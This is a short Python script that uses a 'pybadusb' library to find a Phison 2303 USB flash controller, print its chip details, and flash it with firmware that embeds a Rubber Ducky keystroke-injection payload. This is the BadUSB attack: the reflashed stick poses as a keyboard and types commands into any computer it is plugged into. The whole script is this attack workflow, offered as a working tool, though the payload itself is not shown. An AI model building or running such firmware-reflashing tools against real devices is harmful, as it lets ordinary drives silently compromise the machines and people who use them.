from pybadusb import badusb, phison

def print_info(device):
	info  = "\nInformation:\n"
	info += "Chip type: %04X\n" % device.chip_type
	info += "Chip ID:   %s\n" % device.chip_id
	info += "Version:   %d.%d.%d\n" % device.version
	info += "Mode:      %s\n" % device.run_mode
	print info

if __name__ == '__main__':
	payload  = 'rubberducky/inject.bin'
	firmware = 'bin/fw.bin'
	burner   = 'bin/BN03V114M.BIN'
	
	print 'Getting device..'
	device = badusb.getDevice(phison.Phison2303, 'H')
	#device = badusb.findDrive(phison.Phison2303) # alternative
	
	if not device:
		print 'Device not found!'
		exit()
	
	print 'Updating device data...'
	if not device.get_info():
		print 'Failed getting info!'
		device.close()
		exit()
	
	# display found data
	print_info(device)
	
	print 'Embeding payload and burning it...'
	if not badusb.embed_burn(device, payload, firmware, burner):
		print 'Failed burning payload!'
		exit()
	
	print 'Finished!'
	device.close()
